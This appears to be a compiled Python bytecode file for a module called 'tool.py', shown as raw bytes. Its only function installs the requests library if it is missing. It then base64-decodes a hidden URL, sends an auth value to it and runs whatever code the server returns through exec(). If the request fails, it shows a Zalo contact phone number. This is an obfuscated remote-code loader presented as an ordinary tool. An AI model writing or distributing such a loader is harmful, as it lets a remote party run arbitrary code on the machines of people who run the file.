o
    B;za}  �                   @   s   d d� Z edkre �  dS dS )c                  C   sr   dd l } zdd l}W n	   | �d� Y dd l}dd l}zt|j|�d�ddid�j� W d S    td� Y d S )N�    zpip install requestss(   aHR0cHM6Ly9sb2cuYmVydmVyLnRlY2gvbWFpbg==ZauthZ	MaiHuyBao)�datazZalo: 0363997244)	�os�requests�system�base64�execZpostZ	b64decode�text�input)r   r   r   � r
   �tool.py�main   s   $r   �__main__N)r   �__name__r
   r
   r
   r   �<module>   s    
�